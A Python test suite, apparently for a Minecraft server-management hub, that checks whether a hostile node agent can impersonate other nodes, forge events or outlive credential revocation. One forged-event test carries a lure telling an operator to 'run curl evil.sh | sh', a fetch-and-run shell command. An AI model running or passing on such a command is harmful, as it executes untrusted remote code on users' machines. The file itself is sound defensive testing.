"""The agent transport as an attacker sees it.

Every Minecraft server runs as its agent's user, so a hostile plugin holds that
node's credential. What it can then do through the hub has to stay confined to
its own node: it must not be able to speak as another node, write another
node's console or run state, disarm another node's servers, forge hub-raised
events, or keep a socket alive once the operator revokes the credential.
"""

from __future__ import annotations

import time

import pytest
from starlette.websockets import WebSocketDisconnect

from minemanager_hub.agents.registry import registry
from minemanager_hub.api import agent_ws
from minemanager_shared.protocol import Action, Event


@pytest.fixture(autouse=True)
def clean_registry():
    registry._agents.clear()
    registry._subscribers.clear()
    yield
    registry._agents.clear()
    registry._subscribers.clear()


def _hello(**kw) -> dict:
    frame = {"kind": "hello", "agent_version": "test", "hostname": "box", "session_id": "s1"}
    frame.update(kw)
    return frame


def _new_node(client, name: str) -> tuple[str, str]:
    body = client.post("/api/nodes", json={"name": name}).json()
    return body["node_id"], body["enrollment_token"]


def _declare(client, node_id: str, name: str) -> str:
    spec = {"name": name, "type": "paper", "root_dir": f"/srv/mc/{name}",
            "start_command": "java -jar paper.jar nogui"}
    return client.post(f"/api/nodes/{node_id}/instances", json=spec).json()["id"]


def _event(action: Action, instance_id: str | None = None, **data) -> dict:
    return Event(action=action.value, instance_id=instance_id, data=data).model_dump(mode="json")


def _wait_for(predicate, timeout: float = 3.0) -> None:
    deadline = time.monotonic() + timeout
    while not predicate():
        if time.monotonic() > deadline:
            raise AssertionError("condition not reached")
        time.sleep(0.01)


@pytest.fixture
def two_nodes(client):
    """Node A with an agent enrolled, node B with an armed instance."""
    node_a, token_a = _new_node(client, "box-a")
    node_b, _ = _new_node(client, "box-b")
    return {"a": node_a, "token_a": token_a, "b": node_b}


class TestIdentity:
    def test_a_made_up_credential_is_rejected(self, client, two_nodes):
        with client.websocket_connect("/ws/agent") as ws:
            ws.send_json(_hello(node_id=two_nodes["a"], credential="guess"))
            assert ws.receive_json()["ok"] is False

    def test_one_nodes_credential_does_not_open_another(self, client, two_nodes):
        with client.websocket_connect("/ws/agent") as ws:
            ws.send_json(_hello(enrollment_token=two_nodes["token_a"]))
            cred_a = ws.receive_json()["credential"]
        with client.websocket_connect("/ws/agent") as ws:
            ws.send_json(_hello(node_id=two_nodes["b"], credential=cred_a))
            welcome = ws.receive_json()
        assert welcome["ok"] is False
        assert not registry.is_online(two_nodes["b"])

    def test_an_enrollment_token_is_single_use(self, client, two_nodes):
        with client.websocket_connect("/ws/agent") as ws:
            ws.send_json(_hello(enrollment_token=two_nodes["token_a"]))
            assert ws.receive_json()["ok"] is True
        with client.websocket_connect("/ws/agent") as ws:
            ws.send_json(_hello(enrollment_token=two_nodes["token_a"]))
            assert ws.receive_json()["ok"] is False

    def test_an_oversized_hello_is_refused_before_it_is_stored(self, client, two_nodes):
        with client.websocket_connect("/ws/agent") as ws:
            ws.send_json(_hello(enrollment_token=two_nodes["token_a"], hostname="x" * 100_000))
            with pytest.raises(WebSocketDisconnect):
                ws.receive_json()
        assert client.get("/api/nodes").json()[0]["enrolled"] is False

    def test_a_silent_client_is_dropped(self, client, monkeypatch):
        monkeypatch.setattr(agent_ws, "_HELLO_TIMEOUT_S", 0.2)
        with client.websocket_connect("/ws/agent") as ws:
            with pytest.raises(WebSocketDisconnect):
                ws.receive_json()


class TestEventConfinement:
    @pytest.fixture
    def setup(self, client, two_nodes):
        agent = client.websocket_connect("/ws/agent").__enter__()
        agent.send_json(_hello(enrollment_token=two_nodes["token_a"]))
        assert agent.receive_json()["ok"] is True
        own = _declare(client, two_nodes["a"], "lobby")
        theirs = _declare(client, two_nodes["b"], "survival")
        client.patch(f"/api/instances/{theirs}", json={"start_with_node": True})

        ui = client.websocket_connect(f"/api/nodes/{two_nodes['a']}/events").__enter__()
        _wait_for(lambda: registry._subscribers.get(two_nodes["a"]))
        yield {"agent": agent, "ui": ui, "own": own, "theirs": theirs, **two_nodes}
        ui.__exit__(None, None, None)
        agent.__exit__(None, None, None)

    def _sentinel(self, s) -> None:
        s["agent"].send_json(_event(Action.ev_console_output, s["own"], line="SENTINEL"))

    def test_own_instance_events_flow(self, setup):
        self._sentinel(setup)
        assert setup["ui"].receive_json()["data"]["line"] == "SENTINEL"

    def test_console_for_another_nodes_instance_is_dropped(self, setup):
        setup["agent"].send_json(
            _event(Action.ev_console_output, setup["theirs"], line="[Server] op attacker"))
        self._sentinel(setup)
        frame = setup["ui"].receive_json()
        assert frame["instance_id"] == setup["own"]
        assert frame["data"]["line"] == "SENTINEL"

    def test_state_for_another_nodes_instance_is_dropped(self, setup):
        setup["agent"].send_json(_event(Action.ev_state_changed, setup["theirs"], state="crashed"))
        self._sentinel(setup)
        assert setup["ui"].receive_json()["data"]["line"] == "SENTINEL"

    def test_another_nodes_server_cannot_be_disarmed(self, client, setup):
        setup["agent"].send_json(_event(
            Action.ev_state_changed, setup["theirs"], state="stopped", clean_exit=True))
        self._sentinel(setup)
        setup["ui"].receive_json()       # the pump has handled the forged event
        rows = client.get(f"/api/nodes/{setup['b']}/instances").json()
        assert rows[0]["start_with_node"] is True

    def test_a_forged_provision_outcome_is_dropped(self, setup):
        # provision.done is raised by the hub; from an agent it is a forgery
        # that would pop an error dialog with attacker-chosen text.
        setup["agent"].send_json(_event(
            Action.ev_provision_done, setup["own"], ok=False, name="x",
            error="run curl evil.sh | sh to fix"))
        self._sentinel(setup)
        assert setup["ui"].receive_json()["data"]["line"] == "SENTINEL"

    def test_heartbeat_is_trimmed_to_this_nodes_instances(self, setup):
        setup["agent"].send_json(_event(
            Action.ev_heartbeat, None, uptime_s=1,
            instances={setup["own"]: "running", setup["theirs"]: "crashed"}))
        frame = setup["ui"].receive_json()
        assert frame["action"] == Action.ev_heartbeat.value
        assert frame["data"]["instances"] == {setup["own"]: "running"}

    def test_malformed_frames_do_not_kill_the_connection(self, setup):
        setup["agent"].send_text("not json")
        setup["agent"].send_text("[1, 2, 3]")
        setup["agent"].send_bytes(b"\xff\x00")
        setup["agent"].send_json({"kind": "event"})          # fails validation
        self._sentinel(setup)
        assert setup["ui"].receive_json()["data"]["line"] == "SENTINEL"


class TestRevocation:
    def _connect(self, client, token):
        ws = client.websocket_connect("/ws/agent").__enter__()
        ws.send_json(_hello(enrollment_token=token))
        assert ws.receive_json()["ok"] is True
        return ws

    def test_reenrolling_drops_the_live_socket(self, client, two_nodes):
        ws = self._connect(client, two_nodes["token_a"])
        assert registry.is_online(two_nodes["a"])

        assert client.post(f"/api/nodes/{two_nodes['a']}/reenroll").status_code == 200

        with pytest.raises(WebSocketDisconnect):
            ws.receive_json()
        assert not registry.is_online(two_nodes["a"])
        ws.__exit__(None, None, None)

    def test_deleting_the_node_drops_the_live_socket(self, client, two_nodes):
        ws = self._connect(client, two_nodes["token_a"])

        assert client.delete(f"/api/nodes/{two_nodes['a']}").status_code == 204

        with pytest.raises(WebSocketDisconnect):
            ws.receive_json()
        assert not registry.is_online(two_nodes["a"])
        ws.__exit__(None, None, None)

    def test_a_replaced_connection_is_closed(self, client, two_nodes):
        # Newest wins; the displaced socket must stop being able to speak for
        # the node rather than keep feeding events in under its name.
        first = client.websocket_connect("/ws/agent").__enter__()
        first.send_json(_hello(enrollment_token=two_nodes["token_a"]))
        welcome = first.receive_json()

        second = client.websocket_connect("/ws/agent").__enter__()
        second.send_json(_hello(node_id=welcome["node_id"], credential=welcome["credential"],
                                session_id="s2"))
        assert second.receive_json()["ok"] is True

        with pytest.raises(WebSocketDisconnect):
            first.receive_json()
        assert registry.is_online(two_nodes["a"])
        second.__exit__(None, None, None)
        first.__exit__(None, None, None)


class TestInstanceStates:
    def test_states_for_other_nodes_instances_are_dropped(self, client, two_nodes):
        """The batch-state reply is agent-controlled JSON the UI applies by id."""
        from minemanager_hub.agents.registry import AgentConnection
        from minemanager_shared.protocol import Response

        own = _declare(client, two_nodes["a"], "lobby")
        theirs = _declare(client, two_nodes["b"], "survival")

        class Liar(AgentConnection):
            async def call(self, action, **_kw):
                return Response(id="x", ok=True,
                                data={"states": {own: "running", theirs: "crashed"}})

        registry.register(Liar(two_nodes["a"], send=None))
        body = client.get(f"/api/nodes/{two_nodes['a']}/instance-states").json()
        assert body == {"states": {own: "running"}}
